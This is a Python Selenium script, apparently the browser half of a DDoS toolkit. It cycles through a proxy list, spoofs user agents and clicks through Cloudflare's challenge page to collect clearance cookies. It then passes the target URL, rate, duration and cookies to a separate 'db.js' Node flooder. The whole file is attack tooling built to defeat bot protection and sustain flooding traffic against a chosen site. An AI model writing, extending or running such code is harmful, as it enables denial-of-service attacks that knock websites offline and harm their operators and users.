import sys
import time
import random
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from multiprocessing import Pool

COOKIES_MAX_RETRIES = 1

def error_handler(error):
    print(error)

def read_proxies_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            proxies = file.read().strip().split('\n')
            return proxies
    except Exception as error:
        print(f"Error reading proxies file: {error}")
        return []

def detect_challenge(driver, proxy):
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'title')))
        title = driver.title
        if title == "Attention Required! | Cloudflare":
            raise Exception("Proxy blocked")

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
        content = driver.page_source
        if "challenge-platform" in content:
            print(f"\033[33mSTART BYPASS PROXY: {proxy}\033[0m")
            time.sleep(12)
            iframe = driver.find_element_by_tag_name('iframe')
            driver.switch_to.frame(iframe)
            WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'iframe[src*="challenges"]')))
            iframe.click()
            time.sleep(6)
            return True
        print(f"\033[33mNo challenge detected {proxy}\033[0m")
        time.sleep(10)
        return False
    except Exception as e:
        print(e)
        return False

def open_browser(target_url, proxy):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",
    ]
    user_agent = random.choice(user_agents)

    chrome_options = Options()
    chrome_options.add_argument(f'--proxy-server=http://{proxy}')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument(f'--user-agent={user_agent}')
    chrome_options.headless = True

    driver = webdriver.Chrome(options=chrome_options)
    driver.set_page_load_timeout(60)
    
    try:
        driver.get(target_url)
        if detect_challenge(driver, proxy):
            return None
        
        cookies = driver.get_cookies()
        cookies_str = "; ".join([f"{cookie['name']}={cookie['value']}" for cookie in cookies])
        
        return {
            "title": driver.title,
            "proxy": proxy,
            "user_agent": user_agent,
            "cookies": cookies_str
        }
    except Exception as e:
        print(f"Error: {e}")
        return None
    finally:
        driver.quit()

def start_thread(target_url, proxy, duration, rate, retries=0):
    if retries == COOKIES_MAX_RETRIES:
        return None
    response = open_browser(target_url, proxy)
    if response:
        if response['title'] == "Just a moment...":
            print(f"\033[31mRUN PROXY: {proxy} - Clicking captcha failed\033[0m")
            return start_thread(target_url, proxy, duration, rate, retries + 1)
        
        cookies_info = (
            f"pageTitle: {response['title']}\n"
            f"proxyAddress: {response['proxy']}\n"
            f"userAgent: {response['user_agent']}\n"
            f"cookies: {response['cookies']}\n"
        )
        print(f"\033[32m{{\n{cookies_info}}}\033[0m")
        
        subprocess.Popen(["node", "db.js", target_url, str(duration), rate, "4", response['user_agent'], response['cookies'], 'http'])
        return response
    else:
        return start_thread(target_url, proxy, duration, rate, retries + 1)

def main():
    if len(sys.argv) < 6:
        print("Usage: python browser.py <url> <time> <rate> <threads> <proxy>")
        sys.exit(1)

    target_url = sys.argv[1]
    duration = int(sys.argv[2])
    rate = sys.argv[3]
    threads = int(sys.argv[4])
    proxy_file = sys.argv[5]

    proxies = read_proxies_from_file(proxy_file)
    with Pool(threads) as pool:
        results = [pool.apply_async(start_thread, (target_url, proxy, duration, rate)) for proxy in proxies]
        for result in results:
            result.get()
        time.sleep(duration)

if __name__ == "__main__":
    main()
